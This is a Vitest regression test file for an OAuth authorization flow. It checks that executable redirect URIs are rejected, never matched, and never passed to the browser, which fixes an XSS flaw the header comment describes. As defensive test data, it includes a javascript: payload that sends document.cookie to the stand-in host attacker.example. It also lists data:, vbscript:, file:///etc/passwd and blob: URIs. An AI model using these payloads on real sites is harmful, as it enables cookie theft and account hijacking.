import { beforeEach, describe, expect, it, vi } from 'vitest';

/**
 * Executable redirect URIs (deepsec pluggedin-app-xss-6e4144fafe).
 *
 * A CIMD document (or a DCR registration) could list `javascript:` as a
 * redirect URI. redirectUriMatches compared the parsed components of two
 * identical `javascript:` URIs, found them equal, and the authorize page signed
 * the URI into a consent ticket. Both consent actions hand that URI back and the
 * consent form assigns it to window.location.href — script in the app's origin,
 * even when the user clicks Cancel.
 *
 * RFC 9700 / OAuth 2.1: redirect URIs are https, loopback http (RFC 8252 s7.3)
 * or a native app's private-use scheme (RFC 8252 s7.1). Nothing that executes
 * or reads local content is a redirect target, at registration or at redirect.
 */

const m = vi.hoisted(() => ({
  resolveClient: vi.fn(),
  redirect: vi.fn((url: string) => {
    throw Object.assign(new Error('NEXT_REDIRECT'), { url });
  }),
}));

vi.mock('@/db', () => ({ db: {} }));
vi.mock('next-auth/next', () => ({
  getServerSession: () => Promise.resolve({ user: { id: 'user-1' } }),
}));
vi.mock('@/lib/auth', () => ({ authOptions: {} }));
vi.mock('@/app/actions/projects', () => ({
  getProjects: () => Promise.resolve([{ uuid: 'hub-1', name: 'Hub One' }]),
}));
vi.mock('next/navigation', () => ({ redirect: m.redirect }));
vi.mock('@/lib/oauth/provider/clients', async (importOriginal) => ({
  ...(await importOriginal<typeof import('@/lib/oauth/provider/clients')>()),
  resolveClient: m.resolveClient,
}));

import { denyConsent } from '@/app/oauth/authorize/actions';
import AuthorizePage from '@/app/oauth/authorize/page';
import { buildErrorRedirect } from '@/lib/oauth/provider/authorize';
import { validateCimdDocument } from '@/lib/oauth/provider/clients';
import { issueConsentTicket } from '@/lib/oauth/provider/consent-ticket';
import { redirectUriMatches } from '@/lib/oauth/provider/redirect-uri';

const CLIENT_ID = 'https://attacker.example/cimd.json';
const JS_URI = 'javascript:fetch(`//attacker.example/?c=${document.cookie}`)//';

const EXECUTABLE = [
  JS_URI,
  'JavaScript:alert(1)//',
  'data:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
  'file:///etc/passwd',
  'blob:https://plugged.in/0f0e6d1c-0000-4000-8000-000000000000',
];

function cimd(redirect_uris: string[]) {
  return { client_id: CLIENT_ID, client_name: 'Totally Claude', redirect_uris };
}

beforeEach(() => {
  vi.clearAllMocks();
  process.env.NEXTAUTH_SECRET = 'test-secret-for-consent-tickets';
  process.env.NEXTAUTH_URL = 'https://plugged.in';
});

describe('registration refuses redirect URIs that are not redirect targets', () => {
  it.each(EXECUTABLE)('rejects a CIMD document listing %s', (uri) => {
    const result = validateCimdDocument(CLIENT_ID, cimd(['https://claude.ai/api/mcp/auth_callback', uri]));
    expect(result.valid).toBe(false);
  });

  it('rejects plain http to a non-loopback host', () => {
    expect(validateCimdDocument(CLIENT_ID, cimd(['http://attacker.example/callback'])).valid).toBe(false);
  });

  it('rejects a redirect URI carrying a fragment (RFC 6749 s3.1.2)', () => {
    expect(validateCimdDocument(CLIENT_ID, cimd(['https://claude.ai/cb#frag'])).valid).toBe(false);
  });

  it('still accepts https, loopback http and native private-use schemes', () => {
    const result = validateCimdDocument(
      CLIENT_ID,
      cimd([
        'https://claude.ai/api/mcp/auth_callback',
        'http://localhost/callback',
        'http://127.0.0.1/callback',
        'http://[::1]/callback',
        'cursor://anysphere.cursor-retrieval/oauth/callback',
        'com.example.app:/oauth2redirect',
      ])
    );
    expect(result.valid).toBe(true);
  });
});

describe('matching never approves an executable URI', () => {
  it.each(EXECUTABLE)('does not match %s against itself', (uri) => {
    expect(redirectUriMatches(uri, uri)).toBe(false);
  });

  it('still matches the ordinary cases', () => {
    expect(
      redirectUriMatches('https://claude.ai/api/mcp/auth_callback', 'https://claude.ai/api/mcp/auth_callback')
    ).toBe(true);
    expect(redirectUriMatches('http://127.0.0.1:3118/callback', 'http://127.0.0.1/callback')).toBe(true);
    expect(
      redirectUriMatches('cursor://anysphere.cursor-retrieval/oauth/callback', 'cursor://anysphere.cursor-retrieval/oauth/callback')
    ).toBe(true);
  });
});

describe('no code path redirects to an executable URI', () => {
  it('buildErrorRedirect refuses to build one', () => {
    expect(() => buildErrorRedirect(JS_URI, 'access_denied', 'declined', 'xyz')).toThrow();
  });

  it('the authorize page does not issue a consent ticket for an already-stored executable URI', async () => {
    // A client cached before registration-time validation existed.
    m.resolveClient.mockResolvedValue({
      uuid: 'client-uuid',
      client_id: CLIENT_ID,
      client_name: 'Totally Claude',
      redirect_uris: [JS_URI],
      registration_type: 'cimd',
    });

    const element = (await AuthorizePage({
      searchParams: Promise.resolve({
        response_type: 'code',
        client_id: CLIENT_ID,
        redirect_uri: JS_URI,
        code_challenge: 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM',
        code_challenge_method: 'S256',
        state: 'xyz',
      }),
    })) as { type: unknown; props: Record<string, unknown> };

    expect(element.props).not.toHaveProperty('ticket');
    expect(m.redirect).not.toHaveBeenCalled();
  });

  it('denying a ticket that carries an executable URI does not hand it to the browser', async () => {
    // A ticket signed before this fix shipped (they live ten minutes).
    const ticket = issueConsentTicket(
      {
        clientUuid: 'client-uuid',
        redirectUri: JS_URI,
        scopes: ['library:read'],
        codeChallenge: 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM',
        state: 'xyz',
      },
      'user-1'
    );

    const outcome = await denyConsent(ticket).then(
      (result) => result,
      (error: unknown) => ({ thrown: String(error) })
    );

    expect(JSON.stringify(outcome).toLowerCase()).not.toContain('javascript:');
  });
});
